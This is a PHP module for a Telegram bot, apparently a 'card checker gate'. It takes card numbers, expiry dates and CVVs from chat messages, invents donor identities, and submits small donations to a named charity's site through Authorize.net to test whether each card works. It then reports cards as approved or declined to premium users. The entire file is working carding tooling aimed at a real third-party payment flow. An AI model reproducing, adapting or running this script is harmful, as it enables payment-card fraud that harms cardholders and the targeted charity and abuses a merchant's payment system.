<?php

#----------------------------------------------------------------------#
#   GATE: AuthNet Charge 3Req (AMOUNT = CUSTOM)                        #
#   SITE: https://www.pandasinternational.org/                         #
#----------------------------------------------------------------------#
$gate = "AuthNet Charge ($3)";


if ((strpos($message, "/an2") === 0) || (strpos($message, "!an2") === 0)){

  if (in_array($userId, $premium_users) === false){
    sendMessage($chatId,$premium_unauth_msg, $message_id);
    return;
    }

sendaction($chatId, "typing");
error_reporting(0);
ini_set('display_errors', 0);
date_default_timezone_set('America/Buenos_Aires');


if ($_SERVER['REQUEST_METHOD'] == "POST")   { extract($_POST); }
elseif ($_SERVER['REQUEST_METHOD'] == "GET") { extract($_GET); }



//================ [ INCLUDE FUNCTIONS ] ===============//
//include "./Tools/functions/usefun.php";
//include "./Tools/functions/flagsgen.php";


//================ [ EXPLODE & LISTA ] ===============// 

$lista = substr($message, 4);
    $amount = multiexplode(array("*"), $lista)[1];
        preg_match_all('!\d+!', $amount, $amot);
        $amt = $amot[0][0];;
    if($amt > 50) { $amt = "50"; }
    if($amt < 1) { $amt = "1"; }

$lista = preg_replace('/[^0-9]+/', ' ', $lista);
$lista = ltrim($lista);
    $cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];


$strlen1 = strlen($mes);
$ano1 = $ano;
    if(strlen($strlen1 > 2)) {
    $ano = $cvv; 
    $cvv = $mes;
    $mes = $ano1; }


if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";

$first6 = substr($cc, 0, 6);
$last4 = substr($cc, 12, 4);
$lista = "$cc|$mes|$ano|$cvv";






//==================[BIN LOOK-UP]======================//
$bin = substr("$cc", 0, 6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$bin.'');
$fim = curl_exec($ch);
curl_close($ch);
$bank = urlencode(GetStr($fim, '"bank":{"name":"', '"'));
$brand = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$level = GetStr($fim, '"brand":"', '"');
$name = GetStr($fim, '"name":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
//$benk = ucwords("$bank");

$bindata1 = " $bin | $brand | $type | $level | .$bank | $name ($emoji) ";
$bininfo = "$brand | $type | $level";
$cuntry = "$name ($emoji)";
//$bank = ".$bank";



//=============== [ Random User Details ] ==============//
$get = file_get_contents('https://random-data-api.com/api/users/random_user');
preg_match_all("(\"first_name\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last_name\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"street_address\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"zip_code\":\"(.*)\")siU", $get, $matches1);
$zip = $matches1[1][0];
preg_match_all("(\"country\":\"(.*)\")siU", $get, $matches1);
$country = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email1 = $matches1[1][0];

$serve_arr = array("gmail.com","hotmail.com","yahoo.com","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email = "".$name.".".$last."1".rand(000,999)."@".$serv_rnd."";
//$username1 = "".$name."".$last."".rand(1000,9999)."";
$pass = "".$name."@".rand(1000,9999)."";
$phone = "917288".rand(1111,9999)."";
$date = ''.date("20y-m-d").'';
if(strlen($zip) > 5) $zip = substr($zip, 0, 5);

$rand = " $name - $last - $street - $city - $zip - $state - $email - $country - $date";







$ip = "Live! ✅";
$gate = 'AuthNet 1 ($'.$amt.')';

//================= [ CURL REQUESTS ] =================//

#--------------------[0th REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.pandasinternational.org/new-homepage/donate-today/donations/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$headers = array();
$headers[] = 'authority: www.pandasinternational.org';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'Sec-Fetch-Site: none';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$res = curl_exec($ch);
curl_close($ch);
$nonce = trim(strip_tags(getStr($res,'name="_charitable_donation_nonce" value="', '"')));
$form_id = trim(strip_tags(getStr($res,'name="charitable_form_id" value="', '"')));
$camp_id = trim(strip_tags(getStr($res,'name="campaign_id" value="', '"')));
//echo "Camp ID:- ".$camp_id."<hr>";
//echo "Form Id:- ".$form_id."<hr>";
//echo "Nonce:- ".$nonce."<hr>";



#--------------------[1th REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api2.authorize.net/xml/v1/request.api');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$headers = array();
$headers[] = 'Accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Content-Type: application/json; charset=UTF-8';
$headers[] = 'Host: api2.authorize.net';
$headers[] = 'Origin: https://www.pandasinternational.org';
$headers[] = 'Referer: https://www.pandasinternational.org/new-homepage/donate-today/donations/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'Sec-Fetch-Site: cross-site';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"securePaymentContainerRequest":{"merchantAuthentication":{"name":"2b67TdSpk","clientKey":"7WPHzQQ976W7CGPN3mur5BcgGX6sJvaHH9UtgAuAzNJm56aF62cr3EV28nCWYSPr"},"data":{"type":"TOKEN","id":"'.SID().'","token":{"cardNumber":"'.$cc.'","expirationDate":"'.$mes.''.$ano.'","cardCode":"'.$cvv.'","zip":"'.$zip.'"}}}}');
$res1 = curl_exec($ch);
curl_close($ch);
$tok = trim(strip_tags(getStr($res1,'"dataValue":"','"')));



#--------------------[2th REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.pandasinternational.org/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$headers = array();
$headers[] = 'authority: www.pandasinternational.org';
$headers[] = 'accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'origin: https://www.pandasinternational.org';
$headers[] = 'referer: https://www.pandasinternational.org/new-homepage/donate-today/donations/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36';
$headers[] = 'X-Requested-With: XMLHttpRequest';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'charitable_form_id='.$form_id.'&'.$form_id.'=&_charitable_donation_nonce='.$nonce.'&_wp_http_referer=%2Fnew-homepage%2Fdonate-today%2Fdonations%2F&campaign_id='.$camp_id.'&description=General+Donations&ID=0&anet_token='.$tok.'&anet_token_description=COMMON.ACCEPT.INAPP.PAYMENT&gateway=authorize_net&donation_amount=custom&custom_donation_amount=5.00&recurring_donation=once&first_name='.$name.'&last_name='.$last.'&email='.urlencode($email).'&address='.urlencode($street).'&address_2=&city='.urlencode($city).'&state='.urlencode($state).'&postcode='.$zip.'&country=US&phone=912446'.rand(1111,9999).'&donor_comment=&cc_expiration%5Bmonth%5D='.$mes.'&cc_expiration%5Byear%5D='.$ano.'&cover_fees=1&action=make_donation&form_action=make_donation');
$res2 = curl_exec($ch);
$msg = trim(strip_tags(getStr($res2,'"errors":["','"]')));
$code = trim(strip_tags(getStr($res2,'"code":"','"')));


$info = curl_getinfo($ch);
$time = $info['total_time'];
$time = substr($time, 0, 4);
curl_close($ch);







//=================== [ RESPONSES ] ===================//

if ((strpos($res2, '"success":true')) || (strpos($res2, '"success":true')) || (strpos($res2, 'Approve')) ){
    sendMessage($chatId, '<b> '.$gate.' | APPROVED ✅ </b>%0A%0A✦ 𝐶𝑎𝑟𝑑: <code>'.$lista.'</code>%0A✦ 𝑅𝑒𝑠𝑢𝑙𝑡: <b>CHARGED '.$amt.'</b> ✅%0A✦ 𝑅𝑒𝑠𝑝𝑜𝑛𝑐𝑒: <b><i> Transaction Successed! </i></b>%0A<a> —————————————————</a>%0A✦ 𝑩𝒊𝒏: <i>'.$bininfo.'</i>%0A✦ 𝑩𝒂𝒏𝒌: <i>'.$bank.'</i>%0A✦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: <i>'.$cuntry.'</i>%0A<a> —————————————————</a>%0A%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>[ᴍᴀғɪᴀ々xᴅ]</a>', $message_id);
}

elseif ((strpos($res2, 'Postal code is incorrect')) || (strpos($res2, 'AVS mismatch'))){
    sendMessage($chatId, '<b> '.$gate.' | APPROVED ✅ </b>%0A%0A✦ 𝐶𝑎𝑟𝑑: <code>'.$lista.'</code>%0A✦ 𝑅𝑒𝑠𝑢𝑙𝑡: <b>AVS Mismatch</b> ✅%0A✦ 𝑅𝑒𝑠𝑝𝑜𝑛𝑐𝑒: <b><i>'.$msg.' - [ '.$code.' ]</i></b>%0A<a> —————————————————</a>%0A✦ 𝑩𝒊𝒏: <i>'.$bininfo.'</i>%0A✦ 𝑩𝒂𝒏𝒌: <i>'.$bank.'</i>%0A✦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: <i>'.$cuntry.'</i>%0A<a> —————————————————</a>%0A%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>[ᴍᴀғɪᴀ々xᴅ]</a>', $message_id);
}

elseif ((strpos($res2, 'decline')) || (strpos($res2, 'error'))){
    sendMessage($chatId, '<b> '.$gate.' | DECLINED! ❌ </b>%0A%0A✦ 𝐶𝑎𝑟𝑑: <code>'.$lista.'</code>%0A✦ 𝑅𝑒𝑠𝑝𝑜𝑛𝑐𝑒: <b><i>'.$msg.' - [ '.$code.' ] </i></b>%0A<a> —————————————————</a>%0A✦ 𝑩𝒊𝒏: <i>'.$bininfo.'</i>%0A✦ 𝑩𝒂𝒏𝒌: <i>'.$bank.'</i>%0A✦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: <i>'.$cuntry.'</i>%0A<a> —————————————————</a>%0A%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>[ᴍᴀғɪᴀ々xᴅ]</a>', $message_id);
}

else {
    sendMessage($chatId, '<b> '.$gate.' | DECLINED! ❌ </b>%0A%0A✦ 𝐶𝑎𝑟𝑑: <code>'.$lista.'</code>%0A✦ 𝑅𝑒𝑠𝑢𝑙𝑡: <b>ERROR! ['.$msg.'.]</b> %0A✦ 𝑅𝑒𝑠𝑝𝑜𝑛𝑐𝑒: <b><i>'.urlencode($res2).'</i></b>%0A<a> —————————————————</a>%0A✦ 𝑩𝒊𝒏: <i>'.$bininfo.'</i>%0A✦ 𝑩𝒂𝒏𝒌: <i>'.$bank.'</i>%0A✦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: <i>'.$cuntry.'</i>%0A<a> —————————————————</a>%0A%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>[ᴍᴀғɪᴀ々xᴅ]</a>', $message_id);
}



curl_close($ch);
unlink("cookie.txt");
}

//====================[ CYBERSOURCE CHARGED ]=====================//

?>